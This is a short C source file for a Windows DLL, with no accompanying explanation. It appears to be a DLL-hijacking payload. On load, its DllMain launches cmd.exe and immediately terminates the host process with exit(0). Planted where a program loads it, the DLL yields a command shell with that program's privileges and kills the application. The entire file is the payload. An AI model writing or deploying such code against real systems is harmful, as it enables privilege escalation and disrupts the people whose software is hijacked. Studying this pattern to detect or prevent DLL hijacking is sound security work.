#include <windows.h>
#include <stdio.h>

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	{
		PROCESS_INFORMATION processInformation = { 0 };
		STARTUPINFO startupInfo = { 0 };
		BOOL result = CreateProcess(L"C:\\Windows\\System32\\cmd.exe", L"", NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, L"C:\\Windows\\System32", &startupInfo, &processInformation);
		exit(0);
	}
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

